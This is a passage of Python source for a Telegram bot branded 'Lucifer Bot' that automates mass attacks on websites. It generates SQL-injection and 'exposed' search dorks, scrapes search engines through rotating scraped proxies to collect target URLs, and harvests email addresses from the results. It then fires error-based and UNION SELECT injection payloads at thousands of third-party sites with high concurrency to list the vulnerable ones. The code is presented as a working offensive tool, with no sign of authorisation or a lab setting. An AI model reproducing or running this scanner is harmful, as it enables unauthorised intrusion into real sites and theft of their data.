        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        "📤 Nᴏᴡ Sᴇɴᴅ Yᴏᴜʀ *Sᴇᴇᴅ Bʀᴀɴᴅs/Kᴇʏᴡᴏʀᴅs*:\n"
        "• Sᴇɴᴅ Tʜᴇᴍ Sᴇᴘᴀʀᴀᴛᴇᴅ Bʏ Nᴇᴡʟɪɴᴇs Oʀ Cᴏᴍᴍᴀs\n"
        "• Oʀ Sᴇɴᴅ A `.txt` Fɪʟᴇ (Oɴᴇ Pᴇʀ Lɪɴᴇ)",
        reply_markup=back_button(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return KW_WAIT_SEEDS


async def kw_get_seeds_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    seeds = [s.strip() for s in data.decode("utf-8", errors="ignore").replace(",", "\n").splitlines() if s.strip()]
    if not seeds:
        await update.message.reply_text("❌ Nᴏ Sᴇᴇᴅs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.", parse_mode=ParseMode.MARKDOWN)
        return KW_WAIT_SEEDS
    return await _run_keyword_gen(update, context, seeds)


async def kw_get_seeds_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    seeds = [s.strip() for s in update.message.text.strip().replace(",", "\n").splitlines() if s.strip()]
    if not seeds:
        await update.message.reply_text("❌ Nᴏ Sᴇᴇᴅs Fᴏᴜɴᴅ. Tʀʏ Aɢᴀɪɴ.", parse_mode=ParseMode.MARKDOWN)
        return KW_WAIT_SEEDS
    return await _run_keyword_gen(update, context, seeds)


async def _run_keyword_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, seeds: list) -> int:
    count      = context.user_data.get("kw_count", 1000)
    spin_frame = [0]
    msg = await update.message.reply_text(KW_SPINNER_FRAMES[0], parse_mode=ParseMode.MARKDOWN)

    async def animate():
        while True:
            try:
                spin_frame[0] = (spin_frame[0] + 1) % len(KW_SPINNER_FRAMES)
                await msg.edit_text(KW_SPINNER_FRAMES[spin_frame[0]], parse_mode=ParseMode.MARKDOWN)
                await asyncio.sleep(0.3)
            except Exception:
                break

    anim_task = asyncio.create_task(animate())
    loop      = asyncio.get_running_loop()
    keywords  = await loop.run_in_executor(None, generate_keywords, seeds, count)
    anim_task.cancel()
    try:
        await anim_task
    except asyncio.CancelledError:
        pass

    await msg.edit_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"✅ 𝙆𝙚𝙮𝙬𝙤𝙧𝙙𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙..!\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🔑 Tᴏᴛᴀʟ: `{len(keywords):,}` Kᴇʏᴡᴏʀᴅs\n⏳ Gᴇɴᴇʀᴀᴛɪɴɢ Kᴇʏᴡᴏʀᴅs...",
        parse_mode=ParseMode.MARKDOWN,
    )
    ts       = datetime.now().strftime("%d%m%y_%H%M%S")
    filename = f"keywords_{len(keywords)}_{ts}.txt"
    content  = "\n".join(keywords).encode("utf-8")
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=filename,
        caption=f"🔑 `{len(keywords):,}` Kᴇʏᴡᴏʀᴅs Gᴇɴᴇʀᴀᴛᴇᴅ",
        parse_mode=ParseMode.MARKDOWN,
    )
    await update.message.reply_text("💡 Sᴛᴀʀᴛ Nᴇxᴛ Sᴛᴇᴘ Fʀᴏᴍ Bᴇʟᴏᴡ", reply_markup=make_main_menu())
    return MENU

# ── DORK FLOW ──────────────────────────────────────────────────────────────────

async def dork_get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    text = update.message.text.strip()
    try:
        count = int(text.replace(",", "").replace(".", ""))
        if count < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Eɴᴛᴇʀ A Vᴀʟɪᴅ Nᴜᴍʙᴇʀ. E.g. `10000`", parse_mode=ParseMode.MARKDOWN)
        return DORK_WAIT_COUNT
    count = min(count, 1_000_000)
    context.user_data["dork_count"] = count
    await update.message.reply_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"✅ Cᴏᴜɴᴛ Sᴇᴛ: `{count:,}` Dᴏʀᴋs.\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        "🔰 Pʜᴀsᴇ 2:\n"
        "• Sᴇɴᴅ Yᴏᴜʀ *Kᴇʏᴡᴏʀᴅs* Tᴏ Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs:\n"
        "• Sᴇɴᴅ Tʜᴇ. (Oɴᴇ Pᴇʀ Lɪɴᴇ Oʀ Cᴏᴍᴍᴀ-Sᴇᴘᴀʀᴀᴛᴇᴅ)\n"
        "• Oʀ Sᴇɴᴅ A `.txt` Fɪʟᴇ",
        reply_markup=back_button(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return DORK_WAIT_KEYWORDS


async def dork_get_keywords_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc      = update.message.document
    file     = await context.bot.get_file(doc.file_id)
    data     = await file.download_as_bytearray()
    keywords = [k.strip() for k in data.decode("utf-8", errors="ignore").replace(",", "\n").splitlines() if k.strip()]
    if not keywords:
        await update.message.reply_text("❌ Nᴏ Kᴇʏᴡᴏʀᴅs Fᴏᴜɴᴅ.", parse_mode=ParseMode.MARKDOWN)
        return DORK_WAIT_KEYWORDS
    return await _run_dork_gen(update, context, keywords)


async def dork_get_keywords_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    keywords = [k.strip() for k in update.message.text.strip().replace(",", "\n").splitlines() if k.strip()]
    if not keywords:
        await update.message.reply_text("❌ Nᴏ Kᴇʏᴡᴏʀᴅs Fᴏᴜɴᴅ.", parse_mode=ParseMode.MARKDOWN)
        return DORK_WAIT_KEYWORDS
    return await _run_dork_gen(update, context, keywords)


async def _run_dork_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, keywords: list) -> int:
    count      = context.user_data.get("dork_count", 5000)
    dork_type  = context.user_data.pop("dork_type", "normal")  # clear after use

    # Pick label & icon based on dork type
    _TYPE_INFO = {
        "hq":      ("🛰️", "HQ SQLi Dorks", "generate_hq_sqli_dorks"),
        "country": ("🌍", "Country Dorks",  "generate_country_dorks"),
        "cms":     ("︎🧳", "CMS Dorks",      "generate_cms_dorks"),
        "exposed": ("🌥️︎", "Exposed Dorks",  "generate_exposed_dorks"),
        "normal":  ("⚧️︎", "Dorks",           "generate_dorks"),
    }
    icon, label, _ = _TYPE_INFO.get(dork_type, _TYPE_INFO["normal"])

    msg = await update.message.reply_text(
        f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓░░░░░░░░░░░░░░░░░░░]`",
        parse_mode=ParseMode.MARKDOWN,
    )

    async def animate():
        frames = [
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓░░░░░░░░░░░░░░░░░]`",
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓▓▓▓░░░░░░░░░░░░░░]`",
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓▓▓▓▓▓▓░░░░░░░░░░░]`",
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░]`",
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░]`",
            f"{icon} *Gᴇɴᴇʀᴀᴛɪɴɢ {label}...*\n`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]`",
        ]
        i = 0
        while True:
            try:
                await msg.edit_text(frames[i % len(frames)], parse_mode=ParseMode.MARKDOWN)
                i += 1
                await asyncio.sleep(0.3)
            except Exception:
                break

    anim_task = asyncio.create_task(animate())
    loop      = asyncio.get_running_loop()

    # Dispatch to the correct generator
    if dork_type == "hq":
        dorks = await loop.run_in_executor(
            None, lambda: generate_hq_sqli_dorks(keywords=keywords, limit=count)
        )
    elif dork_type == "country":
        dorks = await loop.run_in_executor(
            None, lambda: generate_country_dorks(keywords=keywords, limit=count)
        )
    elif dork_type == "cms":
        dorks = await loop.run_in_executor(
            None, lambda: generate_cms_dorks(keywords=keywords, limit=count)
        )
    elif dork_type == "exposed":
        dorks = await loop.run_in_executor(
            None, lambda: generate_exposed_dorks(keywords=keywords, limit=count)
        )
    else:
        dorks = await loop.run_in_executor(None, generate_dorks, keywords, count)

    anim_task.cancel()
    try:
        await anim_task
    except asyncio.CancelledError:
        pass

    await msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n✅ *{label} 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙..!*\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"{icon} Total: `{len(dorks):,}` dorks\n📤 Sᴇɴᴅɪɴɢ Fɪʟᴇ...",
        parse_mode=ParseMode.MARKDOWN,
    )
    ts       = datetime.now().strftime("%d%m%y_%H%M%S")
    filename = f"{dork_type}_dorks_{len(dorks)}_{ts}.txt"
    content  = "\n".join(dorks).encode("utf-8")
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=filename,
        caption=f"{icon} `{len(dorks):,}` {label} Gᴇɴᴇʀᴀᴛᴇᴅ — Rᴇᴀᴅʏ Fᴏʀ URL Pᴀʀsɪɴɢ",
        parse_mode=ParseMode.MARKDOWN,
    )
    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU


# ── PARSER FLOW ────────────────────────────────────────────────────────────────

async def parser_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc   = update.message.document
    file  = await context.bot.get_file(doc.file_id)
    data  = await file.download_as_bytearray()
    dorks = [d.strip() for d in data.decode("utf-8", errors="ignore").splitlines() if d.strip()]
    if not dorks:
        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ..", parse_mode=ParseMode.MARKDOWN)
        return PARSER_WAIT_DORKS
    # No cap — process ALL dorks, timeout scales automatically with count
    return await _run_parser(update, context, dorks)


async def parser_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
    if not dorks:
        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ. Tʀʏ Aɢᴀɪɴ.", parse_mode=ParseMode.MARKDOWN)
        return PARSER_WAIT_DORKS
    return await _run_parser(update, context, dorks)


async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks: list) -> int:
    user_id    = update.effective_user.id
    # ── Live feed register ────────────────────────────────────────────────────
    _LIVE_FEED[user_id] = {
        "name":        update.effective_user.first_name or str(user_id),
        "start":       datetime.now().strftime("%H:%M:%S"),
        "dorks_total": len(dorks),
        "dorks_done":  0,
        "urls_found":  0,
        "phase":       "🔍 Parsing",
    }
    # ── Auto proxy top-up ────────────────────────────────────────────────────
    if len(global_proxy_pool) < _AUTO_PROXY_THRESHOLD:
        _topup_msg = await update.message.reply_text(
            f"⚠️ Pʀᴏxʏ ᴘᴏᴏʟ ʟᴏᴡ (`{len(global_proxy_pool)}`). Aᴜᴛᴏ-sᴄʀᴀᴘɪɴɢ...",
            parse_mode=ParseMode.MARKDOWN,
        )
        _raw_tu = await _scrape_fresh_proxies()
        _parsed_tu = [_parse_proxy(p) for p in _raw_tu if p]
        _live_tu = await check_proxies_bulk(_parsed_tu, timeout=6.0, concurrency=200)
        _before_tu = len(global_proxy_pool)
        for _p in _live_tu:
            if _p not in global_proxy_pool:
                global_proxy_pool.append(_p)
        _save_proxies()
        await _topup_msg.edit_text(
            f"✅ Aᴜᴛᴏ-Pʀᴏxʏ: +`{len(global_proxy_pool)-_before_tu}` | Pool: `{len(global_proxy_pool)}`",
            parse_mode=ParseMode.MARKDOWN,
        )
    # ─────────────────────────────────────────────────────────────────────────
    stop_event = asyncio.Event()
    stop_events[user_id] = stop_event
    stop_kb    = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_parser")]])
    total      = len(dorks)
    done_count    = [0]
    retries_count = [0]
    spin_frame    = [0]
    last_edit     = [0.0]

    # Scale timeout: ~2s/dork average, min 10 min, max 12 hours
    # 500k dorks ➪ ~12 hours; 1k dorks ➪ ~10 min
    _timeout_secs = max(600, min(int(total * 2), 43200))
    # Scale URL limit: allow up to total × 2 URLs (realistic ceiling)
    _url_limit    = max(100_000, total * 2)
    # DDGS variant label for display
    if total <= 500:
        _engine_label = "DDGS×3 + Bing"
    elif total <= 5000:
        _engine_label = "DDGS×2 + Bing"
    else:
        _engine_label = "DDGS×1 + Bing (HQ mode)"

    _start_time   = time.monotonic()

    msg = await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🛰️︎ 𝘿𝙚𝙚𝙥 𝙋𝙖𝙧𝙨𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜...\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"📋 Dᴏʀᴋs Lᴏᴀᴅᴇᴅ: `{total:,}`\n"
        f"⚡ Eɴɢɪɴᴇ: {_engine_label}\n"
        f"⏳ Mᴀx Rᴜɴᴛɪᴍᴇ: `{_timeout_secs//3600}h {(_timeout_secs%3600)//60}m`\n\n"
        f"🌑 🌒 🌓 🌔 🌕 🌖 🌗 🌘\n\n"
        f"_.Sᴄᴀɴɴɪɴɢ Sᴛᴀʀᴛᴇᴅ.._",
        reply_markup=stop_kb,
        parse_mode=ParseMode.MARKDOWN,
    )

    async def on_progress(done, total_, found, retries):
        done_count[0]    = done
        retries_count[0] = retries
        now = time.monotonic()
        if now - last_edit[0] < 2.5:
            return
        last_edit[0] = now
        spin_frame[0] = (spin_frame[0] + 1) % len(PARSER_SPINNER_FRAMES)
        pct    = int((done / total_) * 100) if total_ else 0
        filled = int(pct / 5)
        bar    = "█" * filled + "░" * (20 - filled)
        # ETA calculation
        elapsed = now - _start_time
        if done > 0 and elapsed > 5:
            secs_per_dork = elapsed / done
            remaining_dorks = total_ - done
            eta_secs = int(secs_per_dork * remaining_dorks)
            if eta_secs >= 3600:
                eta_str = f"{eta_secs//3600}h {(eta_secs%3600)//60}m"
            elif eta_secs >= 60:
                eta_str = f"{eta_secs//60}m {eta_secs%60}s"
            else:
                eta_str = f"{eta_secs}s"
            eta_line = f"⏱ ETA: `{eta_str}`\n"
        else:
            eta_line = ""
        try:
            await msg.edit_text(
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                f"🛰️ 𝘿𝙚𝙚𝙥 𝙋𝙖𝙧𝙨𝙚𝙧 — 𝙍𝙪𝙣𝙣𝙞𝙣𝙜\n"
                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                f"📠 Sᴄᴀɴᴇᴅ: `{done:,}/{total_:,}` dorks\n"
                f"✅ Sᴄᴀʀᴘᴇᴅ: `{found:,}` URLs\n"
                f"⚠️ Eʀʀᴏʀs: `{retries}`\n"
                f"⚡ Eɴɢɪɴᴇ: {_engine_label}\n"
                f"{eta_line}\n"
                f"`[{bar}]` {pct}%\n\n"
                f"{PARSER_SPINNER_FRAMES[spin_frame[0]]}\n\n"
                f"🔍 *Sᴄᴀɴɴɪɴɢ Eɴɢɪɴᴇs...*",
                reply_markup=stop_kb,
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass

    # ── Run parser — use shield so timeout preserves partial results ────────────
    _inner = asyncio.ensure_future(
        search_urls_from_dorks(
            dorks,
            limit=_url_limit,
            progress_callback=on_progress,
            stop_event=stop_event,
            proxy_list=effective_proxy_pool(update.effective_user.id),
        )
    )
    try:
        found_urls = await asyncio.wait_for(asyncio.shield(_inner), timeout=float(_timeout_secs))
    except asyncio.TimeoutError:
        # Signal parser to stop new batches, then collect what it has (up to 15s)
        stop_event.set()
        try:
            found_urls = await asyncio.wait_for(_inner, timeout=15.0)
        except Exception:
            _inner.cancel()
            found_urls = []
        hrs = _timeout_secs // 3600
        mins = (_timeout_secs % 3600) // 60
        try:
            await msg.edit_text(
                f"⏳ *Pᴀʀsᴇʀ Hɪᴛᴛɪɴɢ {hrs}ʜ {mins}ᴍ Lɪᴍɪᴛ — Dᴇʟɪᴠᴇʀɪɴɢ `{len(found_urls):,}` Sᴄʀᴀᴘᴇᴅ Uʀʟs.*",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass
    except Exception as e:
        stop_event.set()
        try:
            found_urls = await asyncio.wait_for(_inner, timeout=5.0)
        except Exception:
            _inner.cancel()
            found_urls = []
        if not found_urls:
            try:
                await msg.edit_text(
                    f"❌ *Pᴀʀsᴇʀ Eʀʀᴏʀ:* `{str(e)[:80]}`",
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass
            stop_events.pop(user_id, None)
            return MENU

    stopped = stop_event.is_set()
    status  = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
    emoji   = "🛑" if stopped else "✅"

    await msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🛰️︎ 𝘿𝙚𝙚𝙥 𝙋𝙖𝙧𝙨𝙚𝙧 — {status}!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"📋 Dᴏʀᴋs Pᴀʀsᴇᴅ: `{done_count[0]:,}/{len(dorks):,}`\n"
        f"✅ Oɢ URLs Fᴏᴜɴᴅ: `{len(found_urls):,}`\n"
        f"⚠️ Eʀʀᴏʀs: `{retries_count[0]}`\n\n"
        f"⚜️ *Aʟʟ URLs Aʀᴇ Rᴇᴀʟ — Tʀʏ Oᴘᴇɴɪɴɢ Iɴ Aɴʏ Bʀᴏᴡsᴇʀ*\n\n"
        f"{emoji} Sᴄᴀɴ Dᴏɴᴇ. Fɪʟᴇ Bᴇʟᴏᴡ ⬇️",
        parse_mode=ParseMode.MARKDOWN,
    )

    # ── Dedup — remove already scanned URLs ──────────────────────────────────
    _before_dedup = len(found_urls)
    found_urls    = [u for u in found_urls if u not in _SCANNED_URLS]
    _dedup_removed = _before_dedup - len(found_urls)
    # Add to scanned set + persist
    _SCANNED_URLS.update(found_urls)
    _save_scanned()
    _clear_checkpoint(user_id)
    _LIVE_FEED.pop(user_id, None)

    if found_urls:
        ts       = datetime.now().strftime("%d%m%y_%H%M")
        filename = f"lucifer_urls_{len(found_urls)}_{ts}.txt"
        content  = "\n".join(found_urls).encode("utf-8")
        _dedup_note = f"\n🔁 Dedup removed: `{_dedup_removed:,}` already-seen" if _dedup_removed else ""
        await update.message.reply_document(
            document=io.BytesIO(content),
            filename=filename,
            caption=(
                f"⚔️ `{len(found_urls):,}` URLs Fʀᴏᴍ `{len(dorks):,}` Dᴏʀᴋs"
                f"{_dedup_note}\n🌑 Lᴜᴄɪꜰᴇʀ Bᴏᴛ ⚔️"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
        # ── Auto email harvest ────────────────────────────────────────────────
        _all_text = "\n".join(found_urls)
        _emails   = _extract_emails(_all_text)
        if _emails:
            _econtent = "\n".join(_emails).encode("utf-8")
            await update.message.reply_document(
                document=io.BytesIO(_econtent),
                filename=f"lucifer_emails_{len(_emails)}_{ts}.txt",
                caption=f"📧 `{len(_emails):,}` Eᴍᴀɪʟs Exᴛʀᴀᴄᴛᴇᴅ Fʀᴏᴍ URLs\n⚔️ Lᴜᴄɪꜰᴇʀ Bᴏᴛ",
                parse_mode=ParseMode.MARKDOWN,
            )
        # ── Auto CSV export ───────────────────────────────────────────────────
        import csv as _csv
        _csvbuf = io.StringIO()
        _w = _csv.writer(_csvbuf)
        _w.writerow(["#", "URL"])
        for _i, _u in enumerate(found_urls, 1):
            _w.writerow([_i, _u])
        await update.message.reply_document(
            document=io.BytesIO(_csvbuf.getvalue().encode("utf-8")),
            filename=f"lucifer_urls_{len(found_urls)}_{ts}.csv",
            caption=f"📊 CSV Export — `{len(found_urls):,}` URLs",
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "⚠️ 𝙉𝙤 𝙐𝙧𝙡𝙨 𝙁𝙤𝙪𝙣𝙙\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Tɪᴘs:\n"
            "• Tʀʏ Mᴏʀᴇ Sᴘᴇᴄɪғɪᴄ Dᴏʀᴋs (e.g. `inurl:.php?id= site:com`)\n"
            "• Usᴇ Dᴏʀᴋs Gᴇɴᴇʀᴀᴛᴇᴅ Bʏ Dᴏʀᴋ Gᴇɴᴇʀᴀᴛᴏʀ\n"
            "• Tʀʏ Mᴏʀᴇ Dᴏʀᴋs..!",
            parse_mode=ParseMode.MARKDOWN,
        )

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU


# ── SQLi SCANNER ───────────────────────────────────────────────────────────────

async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
        return SQLI_WAIT_URLS
    # Cap at 10000 URLs to prevent memory overload
    if len(urls) > 10000:
        await update.message.reply_text(
            f"⚠️ *Lᴀʀɢᴇ Fɪʟᴇ Dᴇᴛᴇᴄᴛᴇᴅ..!* `{len(urls):,}` URLs.\n"
            "• Tᴇsᴛɪɴɢ Fɪʀsᴛ `10,000` URLs Tᴏ Pʀᴇᴠᴇɴᴛ Mᴇᴍᴏʀʏ Oᴠᴇʀʟᴏᴀᴅ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        urls = urls[:10000]
    return await _run_sqli(update, context, urls)


async def sqli_get_urls_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    urls = [u.strip() for u in update.message.text.strip().splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
        return SQLI_WAIT_URLS
    return await _run_sqli(update, context, urls)


def _inject_payload(url: str, payload: str) -> str:
    try:
        p      = urlparse(url)
        qs     = parse_qs(p.query, keep_blank_values=True)
        new_qs = {k: [v[0] + payload] for k, v in qs.items()}
        return urlunparse(p._replace(query=urlencode(new_qs, doseq=True)))
    except Exception:
        return url + payload


async def _check_injectable(session: aiohttp.ClientSession, url: str,
                            proxy_url: str = "") -> bool:
    """
    Test URL for SQL injection.
    1. Error-based: inject quote payloads ➪ look for SQL error strings
    2. UNION fallback: try UNION SELECT with a known marker — confirms injectable
       even when the site suppresses error messages.
    """
    req_kw = dict(
        timeout=aiohttp.ClientTimeout(total=3),
        ssl=False,
        allow_redirects=True,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    if proxy_url:
        req_kw["proxy"] = proxy_url

    # ── Pass 1: error-based (all payloads) ────────────────────────────────────
    async def _error_probe(payload):
        test_url = _inject_payload(url, payload)
        try:
            async with session.get(test_url, **req_kw) as resp:
                if resp.status in (200, 500):
                    text = (await resp.text(errors="ignore")).lower()
                    return any(err in text for err in SQLI_ERRORS)
        except Exception:
            pass
        return False

    results = await asyncio.gather(*[_error_probe(p) for p in SQLI_PAYLOADS],
                                   return_exceptions=True)
    if any(r is True for r in results):
        return True

    # ── Pass 2: UNION-based marker reflection ─────────────────────────────────
    # Inject a unique string via UNION SELECT and check if it echoes in the page
    MARK = "LBCHKX99"
    MARK_HEX = "0x" + MARK.encode().hex()
    for cols in (3, 4, 5, 2, 6, 7):
        for pos in range(min(cols, 4)):
            slots = ["NULL"] * cols
            slots[pos] = MARK_HEX
            test_url = _inject_payload(url, "' UNION SELECT " + ",".join(slots) + " -- -")
            try:
                async with session.get(test_url, **req_kw) as resp:
                    if resp.status in (200, 500):
                        text = await resp.text(errors="ignore")
                        if MARK in text:
                            return True
            except Exception:
                pass

    return False


async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: list) -> int:
    user_id    = update.effective_user.id
    stop_event = asyncio.Event()
    stop_events[user_id] = stop_event
    stop_kb    = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_sqli")]])
    total      = len(urls)
    last_edit  = [0.0]

    msg = await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🐊︎ 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🕸️ URLs Tᴏ Tᴇsᴛ: `{total:,}`\n"
        f"⚙️ Pᴀʏʟᴏᴀᴅs: `{len(SQLI_PAYLOADS)}` (error + UNION)\n\n"
        f"`[░░░░░░░░░░░░░░░░░░░░]` 0%\n\n"
        f"_Tᴇsᴛɪɴɢ Fᴏʀ SQL Eʀʀᴏʀs..._",
        reply_markup=stop_kb,
        parse_mode=ParseMode.MARKDOWN,
    )

    injectable  = []
    not_inject  = []
    sem         = asyncio.Semaphore(200)
    _sqli_proxies = effective_proxy_pool(user_id)

    connector = _get_connector()
    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
        async def test_one(url: str):
            if stop_event.is_set():
                return
            async with sem:
                proxy_url = random.choice(_sqli_proxies) if _sqli_proxies else ""
                result = await _check_injectable(session, url, proxy_url=proxy_url)
                if result:
                    injectable.append(url)
                else:
                    not_inject.append(url)
            now = time.monotonic()
            if now - last_edit[0] >= 1.5:
                last_edit[0] = now
                done   = len(injectable) + len(not_inject)
                pct    = int((done / total) * 100) if total else 0
                filled = int(pct / 5)
                bar    = "█" * filled + "░" * (20 - filled)
                try:
                    await msg.edit_text(
                        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                        f"🐊︎ 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙍𝙪𝙣𝙣𝙞𝙣𝙜\n"
                        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                        f"🧤 Tᴇsᴛᴇᴅ    : `{done:,}/{total:,}`\n"
                        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ: `{len(injectable):,}`\n"
                        f"✅ Cʟᴇᴀɴ     : `{len(not_inject):,}`\n\n"
                        f"`[{bar}]` {pct}%\n\n"
                        f"_Injecting payloads..._",
                        reply_markup=stop_kb,
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

        SQLI_BATCH = 800
        for i in range(0, len(urls), SQLI_BATCH):
            if stop_event.is_set():
                break
            await asyncio.gather(*[test_one(url) for url in urls[i: i + SQLI_BATCH]], return_exceptions=True)

    stopped = stop_event.is_set()
    status  = "𝙎𝙏𝙊𝙋𝙋𝙀𝘿" if stopped else "𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿"
    emoji   = "🛑" if stopped else "✅"

    await msg.edit_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🐊 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — {status}!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🧤 Tᴇsᴛᴇᴅ     : `{len(injectable) + len(not_inject):,}/{total:,}`\n"
